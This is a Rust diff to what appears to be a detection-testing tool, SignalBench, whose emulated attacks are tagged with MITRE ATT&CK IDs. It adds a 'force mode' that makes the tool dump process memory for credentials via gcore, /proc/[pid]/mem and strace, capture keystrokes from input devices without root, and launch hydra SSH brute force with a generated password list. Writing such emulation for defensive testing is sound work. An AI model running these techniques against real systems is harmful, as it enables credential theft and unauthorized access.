@@ -132,6 +132,12 @@ impl AttackTechnique for MemoryDumping {
 
             info!("Starting REAL memory dump of process: {process_name} (PID: {target_pid})");
             
+            // Force mode: run BOTH gcore AND /proc/[pid]/mem for maximum telemetry
+            let force_mode = config.force;
+            if force_mode {
+                info!("[T1003.001] [FORCE] Force mode - will attempt BOTH gcore AND /proc/mem methods");
+            }
+            
             // Try gcore first (if available), then fallback to /proc/[pid]/mem
             let gcore_available = Command::new("which")
                 .arg("gcore")
@@ -143,7 +149,10 @@ impl AttackTechnique for MemoryDumping {
             let mut dump_successful = false;
             let mut dump_size = 0u64;
             
-            if gcore_available {
+            if gcore_available || force_mode {
+                if !gcore_available && force_mode {
+                    info!("[T1003.001] [FORCE] Attempting gcore despite not being found on PATH");
+                }
                 info!("Using gcore to dump process memory...");
                 
                 // Create temporary directory for gcore output
@@ -191,8 +200,67 @@ impl AttackTechnique for MemoryDumping {
                 let _ = fs::remove_dir_all(&temp_dir);
             }
             
+            // Enhanced telemetry: ptrace/strace attachment attempts for maximum detection
+            // This is highly detectable by EDR systems
+            info!("Attempting ptrace-based memory access via strace...");
+            
+            let strace_output = Command::new("strace")
+                .arg("-p")
+                .arg(target_pid.to_string())
+                .arg("-o")
+                .arg("/tmp/signalbench_strace_attach.log")
+                .arg("-e")
+                .arg("trace=read,write,openat")
+                .arg("-s")
+                .arg("256")
+                .arg("-f")
+                .arg("-t")
+                .output()
+                .await;
+            
+            match strace_output {
+                Ok(output) => {
+                    if output.status.success() || output.status.code() == Some(1) {
+                        info!("strace ptrace attachment attempted (exit: {:?})", output.status.code());
+                    } else {
+                        let stderr = String::from_utf8_lossy(&output.stderr);
+                        info!("strace returned: {} (expected - ptrace restricted)", stderr.lines().next().unwrap_or(""));
+                    }
+                }
+                Err(e) => {
+                    info!("strace not available or failed: {e} (continuing with other methods)");
+                }
+            }
+            
+            // Enumerate /proc/[pid]/maps and save for telemetry
+            let maps_dump_file = format!("{dump_file}.maps");
+            info!("Enumerating /proc/{target_pid}/maps for memory layout analysis...");
+            
+            let maps_path = format!("/proc/{target_pid}/maps");
+            if let Ok(maps_content) = fs::read_to_string(&maps_path) {
+                if let Ok(mut maps_handle) = File::create(&maps_dump_file) {
+                    writeln!(maps_handle, "=== SignalBench /proc/{target_pid}/maps Enumeration ===").unwrap();
+                    writeln!(maps_handle, "Timestamp: {}", chrono::Local::now()).unwrap();
+                    writeln!(maps_handle, "Process: {process_name} (PID: {target_pid})").unwrap();
+                    writeln!(maps_handle, "\n{maps_content}").unwrap();
+                    info!("Memory maps saved to {maps_dump_file}");
+                }
+            }
+            
+            // Attempt direct /proc/[pid]/mem read for ptrace telemetry
+            info!("Attempting direct /proc/{target_pid}/mem read...");
+            let mem_path_check = format!("/proc/{target_pid}/mem");
+            match File::open(&mem_path_check) {
+                Ok(_) => info!("Successfully opened /proc/{target_pid}/mem for reading"),
+                Err(e) => info!("/proc/{target_pid}/mem access attempt: {e} (generates telemetry)"),
+            }
+            
             // Fallback to /proc/[pid]/mem if gcore failed or unavailable
-            if !dump_successful {
+            // Force mode: run BOTH methods for maximum telemetry
+            if !dump_successful || force_mode {
+                if force_mode && dump_successful {
+                    info!("[T1003.001] [FORCE] Running /proc/mem ALSO (force mode - maximum telemetry)");
+                }
                 info!("Using /proc/[pid]/mem to dump process memory...");
                 
                 let mem_path = format!("/proc/{target_pid}/mem");
@@ -327,10 +395,15 @@ impl AttackTechnique for MemoryDumping {
                 technique_id: self.info().id,
                 success: true,
                 message: format!(
-                    "REAL memory dump complete: {} (PID: {}) - {} bytes dumped, {} credential patterns found",
+                    "REAL memory dump complete: {} (PID: {}) - {} bytes dumped, {} credential patterns found. strace/ptrace attempted.",
                     process_name, target_pid, dump_size, found_patterns.len()
                 ),
-                artifacts: vec![dump_file, analysis_file],
+                artifacts: vec![
+                    dump_file.clone(),
+                    analysis_file,
+                    format!("{dump_file}.maps"),
+                    "/tmp/signalbench_strace_attach.log".to_string(),
+                ],
                 cleanup_required: true,
             })
         })
@@ -449,9 +522,19 @@ impl AttackTechnique for KeyloggerSimulation {
             let mut events_captured = 0;
             let mut potential_credentials = Vec::new();
             let mut artifacts = vec![log_file.clone()];
+            let force_mode = config.force;
             
-            // Attempt REAL device capture if root
-            if is_root {
+            if force_mode {
+                info!("[T1056.001] [FORCE] Force mode - will attempt device capture AND historical analysis");
+                writeln!(file, "[FORCE] Force mode enabled - attempting ALL capture methods for maximum telemetry").unwrap();
+                writeln!(file).unwrap();
+            }
+            
+            // Attempt REAL device capture if root OR force mode
+            if is_root || force_mode {
+                if !is_root && force_mode {
+                    info!("[T1056.001] [FORCE] Attempting device capture despite not running as root");
+                }
                 info!("Running as root - attempting keystroke capture from ALL /dev/input/event0-15 devices");
                 writeln!(file, "## REAL Device Keystroke Capture").unwrap();
                 writeln!(file,"Capture duration: {capture_duration} seconds PER DEVICE").unwrap();
@@ -582,8 +665,11 @@ impl AttackTechnique for KeyloggerSimulation {
             }
             
             // Fallback to historical keystroke analysis (or in addition if real capture failed)
-            if !is_root || events_captured == 0 {
-                if !is_root {
+            // Force mode: always run BOTH device capture AND historical analysis
+            if !is_root || events_captured == 0 || force_mode {
+                if force_mode && (is_root && events_captured > 0) {
+                    info!("[T1056.001] [FORCE] Running historical analysis ALSO (force mode - maximum telemetry)");
+                } else if !is_root {
                     info!("Not running as root - performing historical keystroke analysis");
                 } else {
                     info!("Real device capture unsuccessful - falling back to historical analysis");
@@ -2849,6 +2935,60 @@ impl AttackTechnique for SSHBruteForce {
                 
                 info!("Timing analysis: avg={avg_time}ms, min={min_time}ms, max={max_time}ms");
             }
+            
+            // Attempt hydra execution for process visibility (highly detectable by EDR)
+            writeln!(log, "## Hydra Brute Force Attempt (Process Visibility)").unwrap();
+            info!("Attempting hydra execution for maximum process tree visibility...");
+            
+            // Create password list file for hydra
+            let password_file = format!("/tmp/signalbench_passwords_{session_id}.txt");
+            if let Ok(mut pf) = File::create(&password_file) {
+                for pwd in password_attempts.iter().take(attempt_count) {
+                    writeln!(pf, "{pwd}").unwrap();
+                }
+            }
+            
+            // Execute hydra with visible arguments - highly detectable
+            let hydra_output = Command::new("hydra")
+                .args([
+                    "-l", &test_username,
+                    "-P", &password_file,
+                    "-s", &target_port,
+                    "-t", "4",
+                    "-f",
+                    "-V",
+                    &format!("ssh://{target_host}"),
+                ])
+                .output()
+                .await;
+            
+            match hydra_output {
+                Ok(output) => {
+                    let exit_code = output.status.code().unwrap_or(-1);
+                    let stdout = String::from_utf8_lossy(&output.stdout);
+                    let stderr = String::from_utf8_lossy(&output.stderr);
+                    writeln!(log, "Hydra exit code: {exit_code}").unwrap();
+                    if !stdout.is_empty() {
+                        writeln!(log, "Hydra output (truncated):").unwrap();
+                        for line in stdout.lines().take(20) {
+                            writeln!(log, "  {line}").unwrap();
+                        }
+                    }
+                    if !stderr.is_empty() && stderr.len() < 500 {
+                        writeln!(log, "Hydra stderr: {stderr}").unwrap();
+                    }
+                    info!("Hydra execution complete (exit: {exit_code}) - process visible in tree");
+                }
+                Err(e) => {
+                    writeln!(log, "Hydra not available: {e}").unwrap();
+                    writeln!(log, "Note: Install hydra for additional brute force telemetry").unwrap();
+                    info!("Hydra not available: {e} (sshpass attempts still generate telemetry)");
+                }
+            }
+            
+            // Clean up password file
+            let _ = fs::remove_file(&password_file);
+            writeln!(log).unwrap();
             
             // Write summary
             writeln!(log, "## Summary").unwrap();
